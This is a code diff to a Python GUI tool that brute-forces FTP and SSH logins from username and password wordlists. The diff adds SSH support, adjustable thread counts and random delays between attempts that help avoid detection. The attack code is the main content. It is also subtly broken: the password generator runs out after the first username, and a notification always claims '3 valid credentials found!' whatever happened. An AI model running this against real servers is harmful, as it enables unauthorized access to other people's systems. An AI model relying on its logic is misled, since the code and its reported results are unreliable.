@@ -25,9 +25,12 @@ class Bruteforce(QObject):
     goodcreds = pyqtSignal(list)    
     
     live_attempts = pyqtSignal(str) 
+    
+
 
     def __init__(self, parent=None):
         super().__init__(parent)
+        self.H = utility.Host()
         
         self.client = paramiko.SSHClient()
         self.client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
@@ -82,7 +85,8 @@ class Bruteforce(QObject):
             protocol = input_list[2]
             user_wordlist_dir = input_list[3]
             pass_wordlist_dir = input_list[4]
-            url_wordlist_dir = input_list[5]
+            delay = input_list[5]
+            max_threads = input_list[6]
             
             
             user_list = []
@@ -95,8 +99,10 @@ class Bruteforce(QObject):
             
             
             ## Creating target list - I know I could just use the input_list, however this cuts down on the amount of arguments I need to enter in each method
-            target_list = [input_list[0], input_list[1]]
+            target_list = [ip, port, delay]
+            
         except Exception as e:
+            print(e)
             #self.error(e,"??","??")
             exit()
         
@@ -123,7 +129,7 @@ class Bruteforce(QObject):
             #userpass_combo = itertools.product(username.split(),password.split())
             print("starting threadexe")
 
-            with ThreadPoolExecutor(max_workers=10) as executor:
+            with ThreadPoolExecutor(max_workers=max_threads) as executor:
                 ## Max workers needs fine tunning/an option for how many threads
                 for username in user_list:
                     for password in pass_list:
@@ -131,16 +137,53 @@ class Bruteforce(QObject):
                         ftp_thread = executor.submit(self.ftp, target_list, creds)
                 
                 ftp_thread.result()
+                
+                self.H.sys_notification(["TITLE","FTP Bruteforce Completed\n3 valid credentials found!"])
                 print("DONE BRUTEFORCING")
+                
+        if protocol == "SSH":
+            import itertools
+                           
+            username = self.fileopen(user_wordlist_dir)
+            password = self.fileopen(pass_wordlist_dir)
+                    
+            
+            user_list_len = username.split()
+            pass_list_len = password.split()
+            self.total_combos = len(user_list_len) * len(pass_list_len)
+            
+            
+            print("Generator")
+            user_list = (x for x in username.split())
+            pass_list = (x for x in password.split())
+
+           
+            #self.total_combos = 10
+            #userpass_combo = itertools.product(username.split(),password.split())
+            print("starting threadexe")
+
+            with ThreadPoolExecutor(max_workers=max_threads) as executor:
+                ## Max workers needs fine tunning/an option for how many threads
+                for username in user_list:
+                    for password in pass_list:
+                        creds = (username, password)
+                        ssh_thread = executor.submit(self.ssh, target_list, creds)
+                
+                ssh_thread.result()
+                #print("DONE BRUTEFORCING")
                     
 
     
     def ftp(self, target_list, creds):
         IP = target_list[0]
+        port = target_list[1]
+        delay = target_list[2]
         username = creds[0]
         password = creds[1]
         
         try:
+            time.sleep(random.randint(0,delay))
+            
             ftp = FTP(IP, timeout=.1)
             ftp.login(username, password)
             ftp.close() ## Close is a bit harsher than quit, but quits it asap
@@ -169,11 +212,13 @@ class Bruteforce(QObject):
 
     def ssh(self, target_list, creds):
         IP = target_list[0]
+        port = target_list[1]
+        delay = target_list[2]
         _username = creds[0] # _ for namespace reasons
         _password = creds[1]
         
         try:
-            time.sleep(random.randint(1,10))
+            time.sleep(random.randint(0,delay))
             
             client = paramiko.client.SSHClient()
             client.set_missing_host_key_policy(paramiko.AutoAddPolicy()) ## Ignoring known hosts
